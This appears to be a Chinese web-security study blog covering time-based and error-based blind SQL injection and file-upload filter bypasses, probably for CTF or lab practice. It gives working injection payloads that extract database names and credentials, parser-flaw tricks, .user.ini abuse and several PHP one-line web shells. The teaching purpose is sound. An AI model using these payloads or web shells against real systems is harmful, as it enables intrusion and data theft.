<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sleep()                           :延迟函数</span><br><span class="line">If(condition,true,false)          :条件语句</span><br><span class="line">mid(str,start,length)             :字符串截取</span><br><span class="line">ORD()                             :转换成ascii码</span><br><span class="line">Length()                          :统计长度</span><br><span class="line">version()                         :查看数据库版本</span><br><span class="line">database()                        :查看当前数据库名</span><br><span class="line">user()                            :查看当前用户</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>

<p><strong>延迟注入流程：</strong><br><strong>获取数据库总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and sleep(if((select count(SCHEMA_NAME) from information_schema.SCHEMATA)= 7,0,5))       如果数据库总数等于7响应时间为0秒，如果不等于7 相应时间为5秒</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解当前数据库长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and sleep(if((length(database()) = 8),0,5))--+     //当前数据库名长度为8</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190719191831540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190719191831540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></strong></p>
<p><strong>猜解当前数据库名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and sleep(if((ORD(mid(database(),1,1)) =115 ),0,5))--+    //ascii码115 就是 s</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>猜解当前数据库表的总数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">And sleep(if((注入语句),0,5))   //类似布尔注入推理即可 ，例如：</span><br><span class="line">&#x27; And sleep(if((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()) = 2,0,5))--+</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190719191900887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190719191900887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></strong></p>
<p><strong>猜解当前数据库表的长度</strong><br><strong>根据布尔注入推理即可</strong><br><strong>猜解当前数据库表名</strong><br><strong>猜解当前数据库表的字段总数</strong><br><strong>猜解当前数据库表的字段长度</strong><br><strong>猜解当前数据库表的字段名</strong><br><strong>猜解内容</strong></p>
<p><strong>什么是报错盲注？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为数据库语句中有容错语句，例如：mysqli_error()函数</span><br></pre></td></tr></table></figure>

<p><strong>报错注入又分为两种爆错类型：数据库BUG报错注入和数据库函数报错注入</strong></p>
<p><strong>利用数据库BUG报错注入需要的函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">只要是count()，rand() ，group by 三个函数连用就会造成这种报错</span><br><span class="line">left(rand(),3)     :不一定报错</span><br><span class="line">floor(rand(0)*2)    :一定报错</span><br><span class="line">round(x,d)       :x指要处理的数，d是指保留几位小数</span><br><span class="line">concat()         :字符串拼接</span><br><span class="line">12345</span><br></pre></td></tr></table></figure>

<p><strong>利用函数报错注入需要的函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Updatexml()</span><br><span class="line">Exp()</span><br><span class="line">Geometrycollection()</span><br><span class="line">Polygon()</span><br><span class="line">Multipoint()</span><br><span class="line">Multilinestring()</span><br><span class="line">Multipolygon()</span><br><span class="line">等.....</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure>

<p><strong>利用数据库bug报错注入的流程</strong><br><strong>爆数据库的两种方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and (select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1) from information_schema.columns group by xx)</span><br><span class="line">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select database())) as xx,count(1),3 from information_schema.columns group by xx</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p><strong>爆表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190719191712713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190719191712713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></strong></p>
<p><strong>爆字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select concat(floor(rand(0)*2),&quot;===&quot;,(select column_name from information_schema.columns where TABLE_SCHEMA=database() limit 8,1)) as xx,count(1),3 from information_schema.columns group by xx--+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190719191748593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190719191748593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></strong></p>
<p><strong>猜解内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and ORD(mid((select concat(username,&quot;-----&quot;,password) from security.users limit 0,1),1,1)) =68 %23         //逐个猜解内容（详情见布尔注入）</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong>利用特定函数报错注入的流程：</strong><br><strong>与利用报错步骤相同，比如Updatexml()的注入语句如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and 1=(updatexml(1,concat(0x3a,(select database() )),1))--+</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><strong><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190719192012739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190719192012739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyNDc3MDA3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></strong></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>###一，前端验证：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;li id=<span class="string">&quot;show_code&quot;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>代码<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;line-numbers language-javascript&quot;</span>&gt;</span>function checkFile() &#123;</span></span><br><span class="line"><span class="language-xml">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span></span><br><span class="line"><span class="language-xml">    if (file == null || file == &quot;&quot;) &#123;</span></span><br><span class="line"><span class="language-xml">        alert(&quot;请选择要上传的文件!&quot;);</span></span><br><span class="line"><span class="language-xml">        return false;</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">    //定义允许上传的文件类型</span></span><br><span class="line"><span class="language-xml">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span></span><br><span class="line"><span class="language-xml">    //提取上传文件的类型</span></span><br><span class="line"><span class="language-xml">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span></span><br><span class="line"><span class="language-xml">    //判断上传文件类型是否允许上传</span></span><br><span class="line"><span class="language-xml">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span></span><br><span class="line"><span class="language-xml">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span></span><br><span class="line"><span class="language-xml">        alert(errMsg);</span></span><br><span class="line"><span class="language-xml">        return false;</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line">&lt;/li&gt;</span><br><span class="line"><span class="comment">//文件类型被限定：.jpg||.png||.gif</span></span><br></pre></td></tr></table></figure>

<p>绕过方法：直接f12修改前端的白名单，将后缀改为 .php</p>
<p>bp抓包之后上传一句话木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>###二，检查文件扩展名</p>
<h4 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h4><p><strong>黑名单策略：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//黑名单策略</span></span><br><span class="line">&lt;li id=<span class="string">&quot;show_code&quot;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>代码<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;line-numbers language-php&quot;</span>&gt;</span>$is_upload = false;</span></span><br><span class="line"><span class="language-xml">$msg = null;</span></span><br><span class="line"><span class="language-xml">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span></span><br><span class="line"><span class="language-xml">    if (file_exists(UPLOAD_PATH)) &#123;</span></span><br><span class="line"><span class="language-xml">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span></span><br><span class="line"><span class="language-xml">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line"><span class="language-xml">        $file_name = deldot($file_name);//删除文件名末尾的点</span></span><br><span class="line"><span class="language-xml">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span></span><br><span class="line"><span class="language-xml">        $file_ext = strtolower($file_ext); //转换为小写</span></span><br><span class="line"><span class="language-xml">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span></span><br><span class="line"><span class="language-xml">        $file_ext = trim($file_ext); //收尾去空</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        if(!in_array($file_ext, $deny_ext)) &#123;</span></span><br><span class="line"><span class="language-xml">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="language-xml">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span></span><br><span class="line"><span class="language-xml">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span></span><br><span class="line"><span class="language-xml">                 $is_upload = true;</span></span><br><span class="line"><span class="language-xml">            &#125; else &#123;</span></span><br><span class="line"><span class="language-xml">                $msg = &#x27;上传出错！&#x27;;</span></span><br><span class="line"><span class="language-xml">            &#125;</span></span><br><span class="line"><span class="language-xml">        &#125; else &#123;</span></span><br><span class="line"><span class="language-xml">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span></span><br><span class="line"><span class="language-xml">        &#125;</span></span><br><span class="line"><span class="language-xml">    &#125; else &#123;</span></span><br><span class="line"><span class="language-xml">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>

<p><strong>白名单策略</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;li id=<span class="string">&quot;show_code&quot;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>代码<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">pre</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;line-numbers language-php&quot;</span>&gt;</span>$is_upload = false;</span></span><br><span class="line"><span class="language-xml">$msg = null;</span></span><br><span class="line"><span class="language-xml">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span></span><br><span class="line"><span class="language-xml">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span></span><br><span class="line"><span class="language-xml">    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);</span></span><br><span class="line"><span class="language-xml">    if(in_array($file_ext,$ext_arr))&#123;</span></span><br><span class="line"><span class="language-xml">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="language-xml">        $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        if(move_uploaded_file($temp_file,$img_path))&#123;</span></span><br><span class="line"><span class="language-xml">            $is_upload = true;</span></span><br><span class="line"><span class="language-xml">        &#125; else &#123;</span></span><br><span class="line"><span class="language-xml">            $msg = &#x27;上传出错！&#x27;;</span></span><br><span class="line"><span class="language-xml">        &#125;</span></span><br><span class="line"><span class="language-xml">    &#125; else&#123;</span></span><br><span class="line"><span class="language-xml">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span></span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>

<p><strong>绕过</strong></p>
<p><strong>在一些Web server中，存在解析漏洞:</strong><br><strong>1.老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 &#x2F;.asp&#x2F;目录，那么此目录下面的一切内容都会被当作asp脚本来解析</strong><br><strong>2.老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容来避免黑名单过滤，如 a.asp;jpg</strong><br><strong>3.旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行</strong><br><strong>4.nginx(0.5.x, 0.6.x, 0.7 &lt;&#x3D; 0.7.65, 0.8 &lt;&#x3D; 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）</strong><br><strong>5.apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，从而达到了注入php代码的目的</strong></p>
<p>###三，检查文件类型</p>
<h4 id="3-1-MIME（Content-Type）"><a href="#3-1-MIME（Content-Type）" class="headerlink" title="3.1 MIME（Content Type）"></a>3.1 MIME（Content Type）</h4><p>MIME(Multipurpose Internet Mail Extensions)多用途网络邮件扩展类型，可被称为Media type或Content type，</p>
<p>它设定某种类型的文件当被浏览器打开的时候需要用什么样的应用程序，多用于HTTP通信和设定文档类型例如HTML。</p>
<p>之所以叫多用途网络邮件扩展类型，因为它最早被用于电子邮件系统，后用于浏览器</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>内容类型</th>
<th>文件扩展名</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>application&#x2F;msword</td>
<td>doc</td>
<td>Microsoft Word</td>
</tr>
<tr>
<td>2</td>
<td>application&#x2F;octet-stream bin</td>
<td>dms lha lzh exe class</td>
<td>可执行程序</td>
</tr>
<tr>
<td>3</td>
<td>application&#x2F;pdf</td>
<td>pdf</td>
<td>Adobe Acrobat</td>
</tr>
<tr>
<td>4</td>
<td>application&#x2F;postscript</td>
<td>ai eps ps</td>
<td>PostScript</td>
</tr>
<tr>
<td>5</td>
<td>appication&#x2F;powerpoint</td>
<td>ppt</td>
<td>Microsoft Powerpoint</td>
</tr>
<tr>
<td>6</td>
<td>appication&#x2F;rtf</td>
<td>rtf</td>
<td>rtf 格式</td>
</tr>
<tr>
<td>7</td>
<td>appication&#x2F;x-compress</td>
<td>z</td>
<td>unix 压缩文件</td>
</tr>
<tr>
<td>8</td>
<td>application&#x2F;x-gzip</td>
<td>gz</td>
<td>gzip</td>
</tr>
<tr>
<td>9</td>
<td>application&#x2F;x-gtar</td>
<td>gtar</td>
<td>tar 文档 (gnu 格式 )</td>
</tr>
<tr>
<td>10</td>
<td>application&#x2F;x-shockwave-flash</td>
<td>swf</td>
<td>MacroMedia Flash</td>
</tr>
<tr>
<td>11</td>
<td>application&#x2F;x-tar</td>
<td>tar</td>
<td>tar(4.3BSD)</td>
</tr>
<tr>
<td>12</td>
<td>application&#x2F;zip</td>
<td>zip</td>
<td>winzip</td>
</tr>
<tr>
<td>13</td>
<td>audio&#x2F;basic</td>
<td>au snd</td>
<td>sun&#x2F;next 声音文件</td>
</tr>
<tr>
<td>14</td>
<td>audio&#x2F;mpeg</td>
<td>mpeg mp2</td>
<td>Mpeg 声音文件</td>
</tr>
<tr>
<td>15</td>
<td>audio&#x2F;x-aiff</td>
<td>mid midi rmf</td>
<td>Midi 格式</td>
</tr>
<tr>
<td>16</td>
<td>audio&#x2F;x-pn-realaudio</td>
<td>ram ra</td>
<td>Real Audio 声音</td>
</tr>
<tr>
<td>17</td>
<td>audio&#x2F;x-pn-realaudio-plugin</td>
<td>rpm</td>
<td>Real Audio 插件</td>
</tr>
<tr>
<td>18</td>
<td>audio&#x2F;x-wav</td>
<td>wav</td>
<td>Microsoft Windows 声音</td>
</tr>
<tr>
<td>19</td>
<td>image&#x2F;cgm</td>
<td>cgm</td>
<td>计算机图形元文件</td>
</tr>
<tr>
<td>20</td>
<td>image&#x2F;gif</td>
<td>gif</td>
<td>COMPUSERVE GIF 图像</td>
</tr>
<tr>
<td>21</td>
<td>image&#x2F;jpeg</td>
<td>jpeg jpg jpe</td>
<td>JPEG 图像</td>
</tr>
<tr>
<td>22</td>
<td>image&#x2F;png</td>
<td>png</td>
<td>PNG 图像</td>
</tr>
</tbody></table>
<p>####3.2 文件头部 (GIF89a)</p>
<p>图片的文件头，常见的图片文件头如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gif(GIF89a) : 47 49 46 38 39 61</span><br><span class="line"></span><br><span class="line">jpg、jpeg : FF D8 FF</span><br><span class="line"></span><br><span class="line">png : 89 50 4E 47 0D 0A</span><br></pre></td></tr></table></figure>

<p>当上传php文件时，可以使用<strong>winhex</strong>、<strong>010editor</strong>等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测</p>
<p>###四，.user.ini的使用</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/126962920">https://blog.csdn.net/weixin_52635170/article/details/126962920</a></p>
<p><strong>.user.ini</strong><br><strong>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</strong></p>
<p><strong>.user.ini的妙用原理</strong><br><strong>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</strong></p>
<p><strong>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</strong></p>
<p><strong>.user.ini语句：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         <span class="comment">//包含在文件头</span></span><br><span class="line">auto_append_file = &lt;filename&gt;          <span class="comment">//包含在文件尾</span></span><br></pre></td></tr></table></figure>

<p>###五， 检测文件内容</p>
<p>####5.1文件内容替换</p>
<p><strong>一句话木马内容替换</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[x]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac ../fl*&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`tac ../fl*`<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> `tac /<span class="keyword">var</span>/www/html/fl*`<span class="meta">?&gt;</span></span><br><span class="line">auto_prepend_file = &lt;filename&gt;  </span><br></pre></td></tr></table></figure>

<p>&#x2F;var&#x2F;www&#x2F;html是Linux操作系统下的一个目录,通常用于存放网站相关文件及数据。在Linux系统中,lvar表示变化的数据,&#x2F;www表示该数<br>据是Web服务器相关的,&#x2F;html则是网页文件及数据的存放位置。</p>
<p>更具体地说,&#x2F;var&#x2F;www&#x2F;html目录是Web服务器的默认根目录,也被称为Web根目录。Web服务器将Web根目录作为网站访问的起点,当<br>用户访问该网站时,服务器会从这个目录下查找相应的文件进行响应。</p>
<p>该目录下通常包含网站的各种文件和资源,如HTML、CSS、JavaScript、图片、视频、音频等。此外,还可能包含后端代码文件,如<br>PHP、Python等的脚本文件。</p>
<p>&#x2F;var&#x2F;www&#x2F;html目录对于搭建网站来说非常重要,因为这是网站的默认根目录,所有的网站内容都从这里开始。在搭建网站时,我们需要将<br>相关文件和资源放置在该目录下,并在服务器上设置Web根目录的路径。</p>
<p>总之,&#x2F;var&#x2F;www&#x2F;html是Linux下的一个重要目录,用于存放Web服务器相关的文件及数据,该目录是搭建网站的重要组成部分。</p>
<p>####5.2图片二次渲染   </p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119177948">https://blog.csdn.net/weixin_45588247/article/details/119177948</a></p>
<ol>
<li>二次渲染原理：在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</li>
</ol>
